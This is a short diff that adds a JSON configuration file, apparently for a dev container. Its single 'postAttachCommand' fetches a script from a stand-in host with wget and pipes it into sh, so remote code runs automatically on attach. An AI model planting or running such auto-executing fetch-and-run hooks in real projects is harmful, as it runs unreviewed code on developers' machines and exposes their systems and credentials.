@@ -1,0 +1,3 @@
+{
+  "postAttachCommand": "wget -qO- https://get.tools.example.invalid/attach.sh | sh"
+}
